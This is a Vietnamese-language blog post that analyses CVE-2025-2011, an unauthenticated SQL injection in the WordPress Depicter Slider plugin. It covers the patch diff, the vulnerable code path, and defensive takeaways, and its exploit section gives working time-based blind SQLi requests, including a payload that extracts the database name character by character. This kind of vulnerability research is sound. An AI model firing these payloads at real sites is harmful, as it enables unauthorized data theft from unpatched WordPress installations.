# CVE-2025-2011 Analysis & POC


<!--more-->

Lỗ hổng xảy ra trên plugin **Depicter Slider** của WordPress trước phiên bản **3.6.2**. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.

* **CVE ID**: [CVE-2025-2011](https://www.cve.org/CVERecord?id=CVE-2025-2011)
* **Product**: [WordPress Depicter Slider Plugin](https://wordpress.org/plugins/depicter/)
* **Vulnerability Type**: SQL Injection
* **Affected Versions**: <= 3.6.1
* **CVSS severity**:  High (9.3)
* **Required Privilege**: Unauthenticated

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Depicter Slider**:  v3.6.1(vul) và v3.6.2(fix)
* **diff tool**: **meld** hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version

## Analysis

Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ **GET** request vào SQL query mà không có cơ chế kiểm soát chặt chẽ.

### Patch Diff

Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.
Có sự khác biệt rõ ở file **app/src/Controllers/Ajax/LeadsAjaxController.php**

`index`, `list`, `export` là 3 hàm đáng chú ý nằm trong class `LeadsAjaxController`

```php
public function index(RequestInterface $request, $view)
{
    $args = [
        's'         => Sanitize::textfield($request->query('s', '')),
        // other logic
    ];

    $response   = \Depicter::lead()->get($args);
    $statusCode = isset($response['errors']) ? 400 : 200;

    return \Depicter::json($response)->withStatus($statusCode);
}
```

```php
public function list(RequestInterface $request, $view)
{
    $args = [
        's'                => Sanitize::textfield($request->query('s', '')),
        // other logic
    ];

    $response = \Depicter::leadRepository()->getResults($args);

    return \Depicter::json($response);
}
```

```php
public function export(RequestInterface $request, $view)
{
    $args = [
        's'                => Sanitize::textfield($request->query('s', '')),
        // other logic
    ];

    $response = \Depicter::leadRepository()->getResults($args);

    // other logic

    return \Depicter::json([
        'errors' => [__('error occurred during the export process', 'depicter')]
    ])->withStatus(400);
}
```

Cả 3 hàm đều được vá bằng cách sử dụng `Sanitize::sql` thay cho `Sanitize::textfield` nhằm đảm bảo param `'s'` được làm sạch và escape phù hợp cho ngữ cảnh câu lệnh SQL.

{{< figure src="patch_dif.png" title="Ảnh minh họa sự khác biệt bản vá và bản lỗi" >}}

### How it work?

Để hiểu rõ hơn chức năng của `textfield` và `sql` ta tìm kiếm với từ khóa `function textfield`, có lẽ chúng được đặt trong cùng 1 file vì được gọi bằng cùng 1 class `Sanitize`

> Nếu bạn đã cài **PHP Intelephense Extension** trong **vscode**, bạn có thể di chuyển đến hàm cụ thể bằng cách <kbd>Ctrl</kbd> <kbd>+</kbd> <kbd>Click</kbd> vào hàm cần đến.

{{< figure src="search_1.png" title="Tìm kiếm hàm textfield trong class Sanitize" >}}

`textfield` trả về dữ liệu đã được **sanitize** bằng `sanitize_text_field`, `sql` cũng là hàm trong cùng class, trả về dữ liệu đã được **escape SQL**

```php
public static function sql( $input )
{
    return esc_sql( $input );
}
```

Vì đây là lỗ hổng **unauthenticated**, việc có 3 hàm như này, ta cần xác định xem điểm gọi đến chúng có cơ chế xác thực hay không. Chỉ sau khi chắc chắn rằng hàm nào thực sự được gọi trong bối cảnh không yêu cầu xác thực, ta mới tiếp tục phân tích phần logic bên trong để kiểm tra khả năng gây ra SQL Injection giúp giới hạn phạm vi truy vết.

Để xác định 3 hàm trên được gọi ở đâu, ta có thể tìm kiếm trực tiếp theo tên hàm. Tuy nhiên, các từ khóa như `index`, `list`, hay `export` lại quá phổ biến nên kết quả tìm kiếm sẽ rất nhiều và khó lọc. Vì vậy, thay vì tìm theo tên hàm, ta tìm với từ khóa là tên class `LeadsAjaxController`. Bởi lẽ khi được sử dụng, các hàm này đều phải được gọi thông qua class, nhờ đó phạm vi kết quả tìm kiếm sẽ được thu hẹp và dễ dàng hơn.

{{< figure src="search_2.png" title="Kết quả tìm kiếm LeadsAjaxController trong mã nguồn" >}}

👉 `LeadsAjaxController` được sử dụng trong quá trình đăng ký **route Ajax**. Khi có request gửi tới endpoint `/wp-admin/admin-ajax.php?action=action_here&param1=param1_here&paramN=paramN_here`, hệ thống sẽ dựa trên khai báo `handle('LeadsAjaxController@function')` để gọi tới phương thức tương ứng trong class `LeadsAjaxController`

Cả ba hàm ta đang **focus** đều được gọi bằng phương thức **GET**, nhưng `export` lại có **middleware** xử lý `csrf-api`, nên ta bỏ qua. Chỉ truy vết `index` và `list`

Khi phân tích hai hàm này, ta thấy trong hàm `index`, biến `$response` được gán giá trị từ `\Depicter::lead()->get($args)`. Tuy nhiên, phương thức `get()` lại tiếp tục gọi đến `\Depicter::leadRepository()->getResults($args)`, tức là cùng một logic mà hàm `list` đã gọi trực tiếp. Do đó, ta chọn hàm `list` làm điểm truy vết chính.

```php
public function list(RequestInterface $request, $view)
{
    $args = [
        's'                => Sanitize::textfield($request->query('s', '')),
        'ids'              => Sanitize::textfield($request->query('ids', '')),
        'sources'          => Sanitize::textfield($request->query('sources', '')),
        'dateStart'        => Sanitize::textfield($request->query('dateStart', '')),
        'dateEnd'          => Sanitize::textfield($request->query('dateEnd', '')),
        'order'            => Sanitize::textfield($request->query('order', 'DESC')),
        'orderBy'          => Sanitize::textfield($request->query('orderBy', 'id')),
        'page'             => Sanitize::int($request->query('page', 1)),
        'perPage'          => Sanitize::int($request->query('perpage', 10)),
        'columns'          => Sanitize::textfield($request->query('columns', '')),
        'includeFields'    => Sanitize::textfield($request->query('includeFields', false)),
        'skipCustomFields' => Sanitize::textfield($request->query('skipCustomFields', false))
    ];

    $response = \Depicter::leadRepository()->getResults($args);

    return \Depicter::json($response);
}
```

Để biết `getResults` thực thi query như nào, ta tìm kiếm với từ khóa `function getResults` hoặc <kbd>Ctrl</kbd> <kbd>+</kbd> <kbd>Click</kbd> vào `getResults`

{{< figure src="search_3.png" title="Vị trí định nghĩa hàm getResults trong LeadRepository" >}}

👉 Khi tìm kiếm, ta thấy kết quả có hai hàm `getResults`. Dựa vào tên class có thể nhận thấy sự liên quan giữa class `LeadRepository` và hàm `leadRepository()`, nhiều khả năng `Depicter::leadRepository()` sẽ trả về một **instance** của class **LeadRepository**. Bên cạnh đó, ta có thể dựa vào số lượng tham số truyền vào để xác định chính xác hàm **getResults** nào mới là hàm cần phân tích.

Ta thấy điều kiện `if`,khi không có param `includeFields` thì `getLeadsResults` sẽ được gọi, quan sát `getLeadsResults` trong cùng class:

```php
protected function getLeadsResults( $args ){
    // Purpose of joining tables is being able to search in leadField values as well
    $leadTable = $this->lead()->getTable();
    $leads = Lead::new()->select(
        "{$leadTable}.id",
        "{$leadTable}.source_id",
        "{$leadTable}.content_id",
        "{$leadTable}.content_name",
        "{$leadTable}.created_at",
        "lf.name as fieldName",
        "lf.value as fieldValue"
    )->join( "{$this->leadField()->getTable()} AS lf", "{$leadTable}.id", "=", "lf.lead_id" );

    // other logic

    if( ! empty( $args['s'] ) ){
        $search = "'%". $args['s'] ."%'";
        $leads->appendRawWhere('AND', "( lf.value like {$search} OR {$leadTable}.content_name like {$search} )");
    }

    $results = $this->paginate( $leads, $args );
}
```

Ta thấy param `s`, nơi được bản vá bảo vệ đã được nối trực tiếp vào câu query bằng hàm `appendRawWhere`. Khi đó 1 phần query tương ứng sẽ là:

```sql
AND (lf.value like '%s_here%' OR leadtable.content_name like '%s_here%')
```

👉 Như vậy khi gửi **GET request** đến `/wp-admin/admin-ajax.php` với params:

```
action=depicter-lead-index&s=payload_here
```

* `list` được gọi với duy nhất param `s` được thêm vào `$args`, còn lại được set giá trị mặc định
* `getResults` được gọi với đối số `$args`
* Điều kiện `if( ! $args['includeFields'] )` trong `getResults` khi `includeFields` mặc định là `false` => `getLeadsResults` được gọi
* Thực hiện truy vấn gây lỗi SQLi

## Exploit

### Detect SQLi

Gửi **GET request** chứa payload SQLi.

```http
GET /wp-admin/admin-ajax.php?action=depicter-lead-list&s=999%25'+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a))+--+-+ HTTP/1.1
Host: localhost
...
Cookie: cookie_here
```

Payload được decode:

```sql
999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- -
```

Khi đó một phần của câu query trở thành

```sql
AND (lf.value like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- ' OR leadtable.content_name like '999%' AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #')
```

{{< figure src="resp_time.png" title="Thời gian phản hồi thể hiện payload hoạt động" >}}

👉 Dựa trên thời gian phản hồi => payload hoạt động.

**Subquery trong mệnh đề FROM**: Truy vấn con được coi là bảng tạm thời. MySQL phải thực thi truy vấn con này đầu tiên để tạo bảng tạm thời, sau đó mới thực thi truy vấn chính.

### Get First Letter of Database Name

Điều kiện tiên quyết để **dump được hết data** là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được.

Gửi request với **SQLi payload**:

```http
GET /wp-admin/admin-ajax.php?action=depicter-lead-list&s=999%25'+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+ HTTP/1.1
Host: localhost
...
Cookie: cookie_here
```

Sử dụng `SUBSTRING()` để lấy ký tự đầu tiên của **database name**, `IF()` trả về `SLEEP(5)` nếu ký tự đó là `0x77`('w')

Sử dụng hex encoding `w` thành `0x77` vì `s` được lấy từ **GET** request trong nên bị escape bởi [magic quotes](https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes) trong WordPress và bởi `sanitize_text_field`.

👉 Dựa trên thời gian phản hồi => kí tự đầu tiên đúng là `w`.

## Conclusion

Lỗ hổng **CVE-2025-2011** trong plugin WordPress **Depicter Slider** trước phiên bản **3.6.2**, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection.

Bản vá đã **escape SQL** khiến dữ liệu trước khi đưa vào trở thành chuỗi thuần không thể thoát ra khỏi `'%...%'`

**Key takeaways**:

* Kiểm soát kỹ input từ người dùng.
* Luôn sử dụng `$wpdb->prepare()` khi làm việc với database trong WordPress để tránh SQL Injection.
* Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[ WordPress Depicter Slider Plugin <= 3.6.1 is vulnerable to SQL Injection ](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)


---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-09-30-cve-2025-2011/  

